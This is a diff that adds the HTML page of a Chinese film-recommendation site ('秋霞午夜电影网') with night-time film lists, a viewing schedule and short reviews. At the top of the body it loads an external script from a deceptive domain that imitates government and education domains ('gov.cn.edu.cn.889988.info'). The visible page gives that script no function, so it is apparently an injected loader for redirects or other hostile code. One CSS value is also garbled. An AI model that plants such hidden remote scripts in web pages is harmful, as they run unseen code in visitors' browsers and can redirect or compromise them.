@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋霞午夜电影网 - 夜晚观影、文艺片单与秋色电影推荐</title>
+<meta name="keywords" content="秋霞午夜电影网,午夜电影,秋霞电影,夜间观影,文艺电影,深夜片单">
+<meta name="description" content="秋霞午夜电影网是一个夜间观影推荐站，提供文艺片、剧情片、动画电影与深夜治愈片单，伴你在秋色与夜色里看一部好电影。">
+<link rel="canonical" href="https://qiuxiawuyedianyingwang-top.github.io/">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#0b1020;color:#e7ecf5;line-height:1.75}
+a{text-decoration:none;color:inherit}
+
+/* 夜色霞光背景 */
+.sky{background:linear-gradient(180deg,#0b1020 0%,#16213e 38%,#3a2a4d 66%,#b5654a 100%);min-height:78vh;position:relative;overflow:hidden}
+.moon{position:absolute;top:48px;right:8%;width:90px;height:90px;border-radius:50%;background:radial-gradient(circle at 35% 35%,#fff7e0,#f4c98a 60%,#caa46a);box-shadow:0 0 60px rgba(255,221,153,.45)}
+.star{position:absolute;width:2px;height:2px;background:#fff;border-radius:50%;opacity:.7}
+.hero{max-width:1080px;margin:0 auto;padding:5rem 1.5rem 3rem;position:relative;z-index:2}
+.kicker{font-size:.7rem;letter-spacing:.4em;color:#ffd9a0;text-transform:uppercase}
+.hero h1{font-size:clamp(2rem,5vw,3.4rem);font-weight:900;margin:.8rem 0;color:#fff;text-shadow:0 6px 30px rgba(0,0,0,.5)}
+.hero h1 b{background:linear-gradient(90deg,#ffd9a0,#ff8e72,#9b8cff);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{max-width:560px;color:#cdd6ea;font-size:.95rem;margin-bottom:1.8rem}
+.btn-row{display:flex;gap:.8rem;flex-wrap:wrap}
+.btn{padding:.75rem 1.6rem;border-radius:30px;font-size:.85rem;font-weight:600;border:1px solid #ffd9a0;color:#ffd9a0;background:rgba(255,255,255,.04);transition:.25s}
+.btn:hover{background:#ffd9a0;color:#16213e}
+.btn.solid{background:linear-gradient(90deg,#ff8e72,#9b8cff);border:none;color:#0b1020}
+
+/* 灯柱导航 */
+.lampbar{position:sticky;top:0;z-index:50;background:rgba(11,16,32,.82);backdrop-filter:blur(10px);border-bottom:1px solid #243154}
+.lampbar ul{max-width:1080px;margin:0 auto;display:flex;gap:.3rem;list-style:none;overflow-x:auto;padding:.7rem 1rem}
+.lampbar a{padding:.5rem .9rem;font-size:.82rem;color:#aab6d3;border-radius:20px;white-space:nowrap}
+.lampbar a:hover,.lampbar a.active{color:#0b1020;background:linear-gradient(90deg,#ffd9a0,#ff8e72)}
+
+.wrap{max-width:1080px;margin:0 auto;padding:0 1.5rem}
+.section{padding:3.2rem 0;border-bottom:1px solid #18233f}
+.sec-h{display:flex;align-items:baseline;justify-content:space-between;margin-bottom:1.6rem}
+.sec-h h2{font-size:1.2rem;color:#fff;display:flex;align-items:center;gap:.5rem}
+.sec-h h2 i{width:6px;height:18px;border-radius:3px;background:linear-gradient(#ffd9a0,#9b8cff);display:inline-block}
+.sec-h a{font-size:.78rem;color:#ffd9a0}
+
+/* 夜色片单 */
+.night-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:1.1rem}
+.film{background:#121a30;border:1px solid #243154;border-radius:14px;overflow:hidden;transition:.3s}
+.film:hover{transform:translateY(-5px);border-color:#ff8e72;box-shadow:0 14px 34px rgba(255,142,114,.18)}
+.poster{aspect-ratio:3/4;background:linear-gradient(160deg,#26345c,#3a2a4d 70%,#7a4b53);position:relative;display:flex;align-items:flex-end;padding:.8rem}
+.poster span{font-size:.82rem;font-weight:700;color:#ffe9cf;text-shadow:0 2px 6px rgba(0,0,0,.6)}
+.poster .tag{position:absolute;top:.6rem;left:.6rem;font-size:.62rem;background:#ff8e72;color:#1a1020;padding:.15rem .5rem;border-radius:999px;font-weight:700}
+.poster .score{position:absolute;top:.6rem;right:.6rem;font-size:.68rem;background:#0b1020cc;color:#ffd76a;padding:.15rem .45rem;border-radius:6px}
+.film .meta{padding:.7rem .8rem;font-size:.74rem;color:#9fb0d0;display:flex;justify-content:space-between}
+
+/* 午夜时间带 */
+.timeline{display:flex;flex-direction:column;gap:0;border-left:2px dashed #3a4straight}
+.tl{display:grid;grid-template-columns:90px 1fr;gap:1rem;padding:1rem 0;position:relative}
+.tl::before{content:"";position:absolute;left:-7px;top:1.35rem;width:12px;height:12px;border-radius:50%;background:#ffd9a0;box-shadow:0 0 0 4px #0b1020}
+.tl .time{font-size:.8rem;font-weight:800;color:#ffd9a0}
+.tl h4{font-size:.92rem;color:#fff}
+.tl h4 a:hover{color:#ff8e72}
+.tl p{font-size:.78rem;color:#9fb0d0;margin-top:.2rem}
+
+/* 秋霞影评 */
+.reviews{display:grid;grid-template-columns:1fr 1fr;gap:1.2rem}
+.rc{background:#121a30;border:1px solid #243154;border-radius:14px;padding:1.2rem;transition:.25s}
+.rc:hover{border-color:#9b8cff;background:#141d36}
+.rc .d{font-size:.7rem;color:#ffd9a0;letter-spacing:.12em;margin-bottom:.4rem}
+.rc h4{font-size:.92rem;color:#fff;margin-bottom:.4rem;line-height:1.4}
+.rc h4 a:hover{color:#ffd9a0}
+.rc p{font-size:.78rem;color:#9fb0d0;line-height:1.8}
+
+/* 关于 */
+.about{background:linear-gradient(135deg,#16213e,#3a2a4d);border:1px solid #2c3a63;border-radius:18px;padding:2.2rem}
+.about h3{color:#fff;font-size:1.1rem;margin-bottom:.8rem}
+.about p{color:#cdd6ea;font-size:.88rem;margin-bottom:1rem}
+.stats{display:flex;gap:2rem;flex-wrap:wrap;margin-top:1rem}
+.stats b{display:block;font-size:1.6rem;color:#ffd9a0}
+.stats span{font-size:.72rem;color:#9fb0d0}
+
+footer{background:#070b16;padding:2.4rem 1.5rem;text-align:center;color:#8294b8}
+footer .b{font-weight:900;color:#ffd9a0;letter-spacing:.08em;margin-bottom:.6rem}
+footer a{color:#8294b8;font-size:.78rem;margin:0 .6rem}
+footer a:hover{color:#ffd9a0}
+footer small{display:block;margin-top:1rem;color:#56688c;font-size:.68rem}
+
+@media(max-width:760px){
+.hero{padding:3.4rem 1.1rem 2rem}
+.moon{width:64px;height:64px;top:30px}
+.night-grid{grid-template-columns:repeat(2,1fr)}
+.reviews{grid-template-columns:1fr}
+.tl{grid-template-columns:70px 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="sky">
+<div class="moon"></div>
+<div class="hero">
+<div class="kicker">Night · Autumn · Cinema</div>
+<h1>秋霞<b>午夜</b>电影网</h1>
+<p>秋霞落尽，夜色刚起。这里不吵不闹，只陪你挑一部适合深夜看的好电影：文艺、治愈、悬疑、动画、老片重看。</p>
+<div class="btn-row">
+<a href="#night" class="btn solid">夜场片单</a>
+<a href="#midnight" class="btn">午夜时刻表</a>
+<a href="#reviews" class="btn">秋霞影评</a>
+</div>
+</div>
+</header>
+
+<nav class="lampbar">
+<ul>
+<li><a href="#home" class="active">首页</a></li>
+<li><a href="#night">夜场片单</a></li>
+<li><a href="#midnight">午夜时刻</a></li>
+<li><a href="#reviews">秋霞影评</a></li>
+<li><a href="#about">关于本站</a></li>
+</ul>
+</nav>
+
+<section class="section" id="night">
+<div class="wrap">
+<div class="sec-h"><h2><i></i> 夜场片单</h2><a href="#">全部影片 →</a></div>
+<div class="night-grid">
+<div class="film"><div class="poster"><span class="tag">文艺</span><span class="score">8.9</span><span>花样年华</span></div><div class="meta"><span>2000 · 剧情</span><span>98分钟</span></div></div>
+<div class="film"><div class="poster"><span class="tag">治愈</span><span class="score">8.8</span><span>海街日记</span></div><div class="meta"><span>2015 · 家庭</span><span>126分钟</span></div></div>
+<div class="film"><div class="poster"><span class="tag">动画</span><span class="score">9.1</span><span>千与千寻</span></div><div class="meta"><span>2001 · 奇幻</span><span>125分钟</span></div></div>
+<div class="film"><div class="poster"><span class="tag">悬疑</span><span class="score">8.5</span><span>夜以继日</span></div><div class="meta"><span>2018 · 爱情</span><span>119分钟</span></div></div>
+<div class="film"><div class="poster"><span class="tag">老片</span><span class="score">9.3</span><span>重庆森林</span></div><div class="meta"><span>1994 · 文艺</span><span>102分钟</span></div></div>
+<div class="film"><div class="poster"><span class="tag">深夜</span><span class="score">8.4</span><span>黄昏清兵卫</span></div><div class="meta"><span>2002 · 武士</span><span>129分钟</span></div></div>
+</div>
+</div>
+</section>
+
+<section class="section" id="midnight" style="background:#0a0f1d">
+<div class="wrap">
+<div class="sec-h"><h2><i></i> 午夜观影时刻表</h2><a href="#">完整排片 →</a></div>
+<div class="timeline">
+<div class="tl"><div class="time">21:00</div><div><h4><a href="#">入夜场：慢节奏文艺片</a></h4><p>适合刚下班的大脑——《海街日记》《步履不停》《爱情神话》。</p></div></div>
+<div class="tl"><div class="time">22:30</div><div><h4><a href="#">微醺场：城市与孤独</a></h4><p>东京、香港、上海夜景里的爱情与错过——《重庆森林》《夜以继日》。</p></div></div>
+<div class="tl"><div class="time">00:00</div><div><h4><a href="#">失眠场：悬疑与梦境</a></h4><p>不吓人但上头——《记忆碎片》《路边野餐》《地球最后的夜晚》。</p></div></div>
+<div class="tl"><div class="time">02:00</div><div><h4><a href="#">治愈场：天亮前睡意</a></h4><p>动画、猫、海浪声——《千与千寻》《狼的孩子雨和雪》。</p></div></div>
+</div>
+</div>
+</section>
+
+<section class="section" id="reviews">
+<div class="wrap">
+<div class="sec-h"><h2><i></i> 秋霞影评</h2><a href="#">更多文章 →</a></div>
+<div class="reviews">
+<div class="rc"><div class="d">2026 · 09 · 28</div><h4><a href="#">为什么深夜更适合看文艺片？</a></h4><p>白天我们追情节，深夜才看得见情绪。灯光暗下来，镜头里的沉默反而更响。</p></div>
+<div class="rc"><div class="d">2026 · 09 · 20</div><h4><a href="#">秋色电影清单：枫、雾、长镜头</a></h4><p>《晚春》《秋刀鱼之味》《海街日记》——秋天不是季节，是一种电影语法。</p></div>
+<div class="rc"><div class="d">2026 · 09 · 12</div><h4><a href="#">午夜城市电影：东京/香港/上海</a></h4><p>霓虹、便利店、末班地铁，城市在半夜才会露出它柔软的那一面。</p></div>
+<div class="rc"><div class="d">2026 · 09 · 03</div><h4><a href="#">别只看好莱坞：亚洲夜电影推荐</a></h4><p>是枝裕和、王家卫、洪尚秀、滨口龙介，他们的夜比爆米花电影更长情。</p></div>
+</div>
+</div>
+</section>
+
+<section class="section" id="about" style="background:#0a0f1d">
+<div class="wrap">
+<div class="about">
+<h3>关于秋霞午夜电影网</h3>
+<p><b style="color:#ffd9a0">秋霞午夜电影网</b>是一个“夜间电影推荐站”。我们把“午夜”做成氛围，把“秋霞”做成颜色：不提供盗版播放、不碰成人内容，只做片单、影评和观影节奏。</p>
+<p>如果你睡不着，或者只是想安静下来，这里可以陪你挑一部电影——从落日到天亮。</p>
+<div class="stats">
+<div class="stats"><b>6+</b><span>栏目/板块</span></div>
+<div class="stats"><b>夜场</b><span>核心场景</span></div>
+<div class="stats"><b>文艺/治愈</b><span>选片方向</span></div>
+<div class="stats"><b>合规</b><span>无盗版/无成人</span></div>
+</div>
+</div>
+</div>
+</section>
+
+<footer>
+<div class="b">秋霞午夜电影网</div>
+<a href="#">首页</a><a href="#">夜场片单</a><a href="#">午夜时刻</a><a href="#">秋霞影评</a><a href="#">关于本站</a>
+<small>© 2026 秋霞午夜电影网 · qiuxiawuyedianyingwang-top.github.io · 夜间观影推荐站（非盗版、非成人）</small>
+</footer>
+
+<script>
+var links=document.querySelectorAll('.lampbar a');
+window.addEventListener('scroll',function(){
+var y=window.scrollY;
+document.querySelectorAll('section, header.sky').forEach(function(s,i){
+if(y>=s.offsetTop-90 && y<s.offsetTop+s.offsetHeight-90){
+links.forEach(function(a){a.classList.remove('active')});
+if(links[i-1])links[i-1].classList.add('active');
+}
+});
+});
+</script>
+</body>
+</html>
